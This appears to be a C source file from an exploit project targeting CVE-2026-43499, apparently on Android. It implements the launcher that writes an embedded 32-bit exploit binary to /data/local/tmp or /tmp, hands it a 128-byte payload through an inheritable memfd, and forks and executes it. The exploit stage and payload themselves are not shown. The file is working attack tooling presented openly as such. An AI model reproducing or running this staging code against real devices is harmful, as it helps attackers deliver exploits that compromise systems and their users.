/*
 * api.c — launcher for the embedded 32-bit CVE-2026-43499 stage.
 *
 * Provides:
 *   int exp_stack_once(uint64_t *buffer);
 *
 * The caller prepares a 16-word (128-byte) payload buffer and this
 * function hands it to the embedded armeabi-v7a binary:
 *
 *   1. install_embedded_exp32() writes the embedded binary to a
 *      guest-writable path (once per process);
 *   2. the buffer is stored in an inheritable memfd (no temp files);
 *   3. the child execve()s the 32-bit stage with the memfd number as
 *      argv[1] and the 64-bit side waits for it to finish.
 *
 * Returns the child's exit status, -1 on setup error, -2 if the
 * embedded binary could not be installed/exec'd.
 */

#include "common.h"

/* Embedded 32-bit stage (see src/exp32_blob.S). */
extern const char embedded_exp32_start[];
extern const char embedded_exp32_end[];

/* Payload size: 16 uint64_t words (see src/exp32/main.c). */
#define EXP_BUFFER_BYTES 128

static const char *exp32_local_path(void) {
  static char path[256];
  if (!path[0]) {
    if (access("/data/local/tmp", W_OK) == 0) {
      snprintf(path, sizeof(path), "/data/local/tmp/cve-exp32");
    } else {
      snprintf(path, sizeof(path), "/tmp/cve-exp32");
    }
  }
  return path;
}

/*
 * install_embedded_exp32 — drop the embedded armeabi-v7a exploit stage
 * to a guest-writable path so exp_stack_once() can execve() it.
 */
int install_embedded_exp32(void) {
  static int installed;
  pr_info("[exp32-launch] phase=install-enter pid=%d installed=%d\n",
          getpid(), installed);
  if (installed) {
    return 1;
  }

  const char *dest = exp32_local_path();
  size_t size = (size_t)(embedded_exp32_end - embedded_exp32_start);
  int fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    pr_warning("install_embedded_exp32: open %s errno=%d\n", dest, errno);
    return 0;
  }
  size_t off = 0;
  while (off < size) {
    ssize_t n = write(fd, embedded_exp32_start + off, size - off);
    if (n <= 0) {
      pr_warning("install_embedded_exp32: write errno=%d\n", errno);
      close(fd);
      return 0;
    }
    off += (size_t)n;
  }
  close(fd);
  chmod(dest, 0755);
  installed = 1;
  pr_info("install_embedded_exp32: %s (%zu bytes)\n", dest, size);
  pr_info("[exp32-launch] phase=install-done pid=%d path=%s bytes=%zu\n",
          getpid(), dest, size);
  return 1;
}

int exp_stack_once(uint64_t *buffer) {
  if (!buffer) {
    pr_warning("exp_stack_once: NULL buffer\n");
    return -1;
  }

  if (!install_embedded_exp32()) {
    pr_warning("exp_stack_once: embedded exp32 install failed errno=%d\n",
               errno);
    return -2;
  }

  /* Inheritable by default (no MFD_CLOEXEC): the exec'd child reads it. */
  pr_info("[exp32-launch] phase=before-memfd pid=%d\n", getpid());
  int mfd = (int)syscall(__NR_memfd_create, "exp_buf", 0);
  if (mfd < 0) {
    pr_warning("exp_stack_once: memfd_create errno=%d\n", errno);
    return -1;
  }
  pr_info("[exp32-launch] phase=memfd-created pid=%d fd=%d\n", getpid(), mfd);
  ssize_t written = write(mfd, buffer, EXP_BUFFER_BYTES);
  if (written != EXP_BUFFER_BYTES) {
    pr_warning("exp_stack_once: memfd write %zd errno=%d\n",
               written, errno);
    close(mfd);
    return -1;
  }

  pr_info("[exp32-launch] phase=payload-written pid=%d fd=%d bytes=%zd\n",
          getpid(), mfd, written);
  pr_info("[exp32-launch] phase=before-fork pid=%d\n", getpid());
  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("exp_stack_once: fork errno=%d\n", errno);
    close(mfd);
    return -1;
  }

  if (pid == 0) {
    pr_info("[exp32-launch] phase=child-after-fork pid=%d fd=%d\n", getpid(), mfd);
    char fd_arg[16];
    const char *path = exp32_local_path();
    snprintf(fd_arg, sizeof(fd_arg), "%d", mfd);
    pr_info("[exp32-launch] phase=child-before-exec pid=%d path=%s fd=%d\n",
            getpid(), path, mfd);
    pr_info("[exp32-launch] phase=exec-syscall-enter pid=%d path=%s fd=%d\n",
            getpid(), path, mfd);
    execl(path, path, fd_arg, (char *)NULL);
    /* execl only returns on error. Preserve errno for the upstream path. */
    int rmg_exec_errno = errno;
    pr_warning("[exp32-launch] phase=exec-syscall-failed pid=%d errno=%d\n",
               getpid(), rmg_exec_errno);
    errno = rmg_exec_errno;
    pr_warning("exp_stack_once: execl errno=%d\n", errno);
    _exit(127);
  }

  pr_info("[exp32-launch] phase=parent-after-fork pid=%d child=%d\n",
          getpid(), pid);
  int status;
  pr_info("[exp32-launch] phase=parent-wait-start pid=%d child=%d\n",
          getpid(), pid);
  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {
  }
  pr_info("[exp32-launch] phase=parent-wait-end pid=%d child=%d raw_status=%d\n",
          getpid(), pid, status);
  close(mfd);

  if (WIFEXITED(status)) {
    int exit_code = WEXITSTATUS(status);
    if (exit_code == 127) {
      pr_warning("exp_stack_once: executable not found at %s\n",
                 exp32_local_path());
      return -2;
    }
    return exit_code;
  }

  if (WIFSIGNALED(status)) {
    pr_warning("exp_stack_once: child killed by signal %d\n",
               WTERMSIG(status));
  }
  return -1;
}
